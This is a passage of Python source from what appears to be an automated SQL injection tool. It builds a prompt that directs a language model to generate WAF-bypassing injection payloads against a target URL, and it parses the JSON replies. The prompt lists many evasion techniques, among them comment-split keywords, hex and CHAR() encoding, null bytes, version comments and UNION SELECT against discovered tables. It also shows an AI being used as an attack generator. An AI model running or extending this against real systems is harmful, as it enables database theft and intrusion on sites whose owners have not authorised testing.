                    'encoding': ra.get('encoding_detected', []),
                    'waf': ra.get('waf_signature'),
                    'database': ra.get('database_fingerprint')
                })

        learnings_str = self._format_learnings(learnings)

        # SAST Intelligence: Add discovered schema information
        sast_intel = ""
        if self.sast_profile:
            sast_intel += "\n\n=== SAST INTELLIGENCE (USE THIS!) ===\n"

            if self.sast_profile.database_type:
                sast_intel += f"\n**Confirmed Database**: {self.sast_profile.database_type.upper()} "
                sast_intel += f"(confidence: {self.sast_profile.database_confidence}%)"
                sast_intel += f"\n→ Use {self.sast_profile.database_type}-specific syntax!"

            if self.sast_profile.table_names:
                tables = ', '.join(list(self.sast_profile.table_names)[:5])
                sast_intel += f"\n\n**Discovered Tables**: {tables}"
                sast_intel += "\n→ Target these tables in UNION queries!"
                sast_intel += f"\n   Example: ' UNION SELECT * FROM {list(self.sast_profile.table_names)[0]}--"

            if self.sast_profile.column_names:
                columns = ', '.join(list(self.sast_profile.column_names)[:8])
                sast_intel += f"\n\n**Discovered Columns**: {columns}"
                sast_intel += "\n→ Extract these specific columns!"

            if self.sast_profile.waf_detected:
                sast_intel += f"\n\n**WAF Detected**: {self.sast_profile.waf_detected.upper()}"
                sast_intel += "\n→ Apply WAF-specific bypasses from the start!"

            if self.sast_profile.backend_framework:
                sast_intel += f"\n\n**Backend Framework**: {self.sast_profile.backend_framework}"

        prompt = f"""
You are an expert SQL injection penetration tester performing ADAPTIVE testing with advanced WAF bypass.

TARGET: {target_url}
PARAMETER: {injection_point}
ITERATION: {iteration + 1}/5
DETECTED CONTEXT: {self.detected_context}
DETECTED FILTERS: {', '.join(self.detected_filters) if self.detected_filters else 'None yet'}
{sast_intel}

ADAPTIVE LEARNING FROM PREVIOUS ATTEMPTS:

{learnings_str}

=== CRITICAL: ANALYZE WHAT WE LEARNED ===

From the response analysis above, identify:
1. Which SQL keywords are blocked? (OR, AND, UNION, SELECT, etc.)
2. Which characters are stripped? (', ", --, #, etc.)
3. What encoding is applied? (HTML entities, SQL escaping, URL encoding)
4. Is there a WAF? Which vendor?
5. What database type? (MySQL, PostgreSQL, MSSQL, Oracle, SQLite)

=== ADVANCED SQLi BYPASS TECHNIQUES ===

**If OR keyword is blocked:**
- Use || instead: ' || '1'='1
- Use comment bypass: O/**/R
- Use hex bypass: 0x4f52 (hex for 'OR')
- Case variation: oR, Or, OR

**If AND keyword is blocked:**
- Use &&: ' && '1'='1
- Use comment bypass: AN/**/D
- Alternative logic: Use multiple OR conditions instead

**If UNION keyword is blocked:**
- Comment insertion: UNI/**/ON
- Null byte: UN%00ION
- Case variation: UnIoN
- MySQL version comment: /*!50000UNION*/
- Hex encoding: 0x554e494f4e

**If quotes are blocked (' and "):**
- Use hex strings: 0x61646d696e for 'admin'
- Use CHAR() function: CHAR(97,100,109,105,110) for 'admin'
- Use alternative delimiters if database supports

**If comment syntax is blocked (-- or #):**
- Use NULL byte: %00
- Use semicolon: ;
- Close with OR/AND logic instead
- For LIKE context: Close pattern with wildcard: %'

**If spaces are blocked:**
- Use /**/ comment: SELECT/**/FROM
- Use tabs: SELECT%09FROM
- Use newlines: SELECT%0aFROM
- Use + or %20: SELECT+FROM

**For LIKE context (% wildcards):**
- Must close the LIKE first: %' OR 1=1--
- Or break out: %') OR ('1'='1
- Match the wildcard pattern

**If WAF detected:**
- Mix multiple bypass techniques
- Use encoding combinations
- Try less common SQL syntax
- Use database-specific features

**Database-specific bypasses:**
- MySQL: /*!50000SELECT*/, CHAR(), 0x hex
- PostgreSQL: CHR(), ::text casting, $$ strings
- MSSQL: %09 tabs, CHAR(), WAITFOR DELAY
- Oracle: CHR(), || concatenation
- SQLite: Less strict syntax

=== RESPONSE FORMAT ===

Generate 5 COMPLETELY DIFFERENT SQLi payloads based on the learnings above.

**CRITICAL: Respond with ONLY a JSON array. No explanatory text before or after.**

[
  {{
    "payload": "SPECIFIC_BYPASS_AVOIDING_BLOCKED_ELEMENTS",
    "technique": "technique_name",
    "reasoning": "Why this bypasses the detected protections",
    "bypass_technique": "Specific bypass method used (e.g., comment insertion, hex encoding, etc.)",
    "confidence": 0-100
  }}
]

**REQUIREMENTS:**
- Generate 5 payloads using DIFFERENT bypass techniques
- Explicitly avoid blocked keywords/characters
- Reference specific learnings in reasoning
- Be creative - think outside common patterns
- **RESPOND WITH ONLY JSON - NO OTHER TEXT**
"""
        return prompt

    def _format_learnings(self, learnings: List[Dict]) -> str:
        """Format learnings for prompt"""
        if not learnings:
            return "No previous attempts yet - this is the first iteration."

        formatted = []
        for i, learn in enumerate(learnings, 1):
            formatted.append(f"""
Attempt {i}:
  Payload: {learn['payload']}
  What happened: {learn['what_happened']}
  Transformation: {learn.get('transformation', 'unknown')}
  Blocked chars: {', '.join(learn.get('blocked_chars', [])) if learn.get('blocked_chars') else 'None'}
  Encoding: {', '.join(learn['encoding']) if learn.get('encoding') else 'None'}
  WAF: {learn.get('waf', 'None')}
  Database: {learn.get('database', 'Unknown')}
""")
        return "\n".join(formatted)

    def _clean_json_array_response(self, response: str) -> str:
        """Clean LLM response to extract JSON array"""
        if not response:
            return "[]"

        cleaned = response.strip()

        # Remove markdown code blocks
        if "```json" in cleaned:
            start = cleaned.find("```json") + 7
            end = cleaned.find("```", start)
            if end != -1:
                cleaned = cleaned[start:end].strip()
        elif "```" in cleaned:
            first_block = cleaned.find("```")
            start = first_block + 3
            newline = cleaned.find("\n", start)
            if newline != -1:
                start = newline + 1
            end = cleaned.find("```", start)
            if end != -1:
                cleaned = cleaned[start:end].strip()

        # Extract JSON array
        if '[' in cleaned:
            start = cleaned.find('[')
            bracket_count = 0
            in_string = False
            escape_next = False

            for i in range(start, len(cleaned)):
                char = cleaned[i]

                if escape_next:
                    escape_next = False
                    continue

                if char == '\\':
                    escape_next = True
                    continue

                if char == '"' and not escape_next:
                    in_string = not in_string
                    continue

                if not in_string:
                    if char == '[':
                        bracket_count += 1
                    elif char == ']':
                        bracket_count -= 1
                        if bracket_count == 0:
                            json_str = cleaned[start:i+1]
                            try:
                                json.loads(json_str)
                                return json_str
                            except:
                                pass

        self.logger.warning("Could not extract valid JSON array from LLM response")
        return "[]"
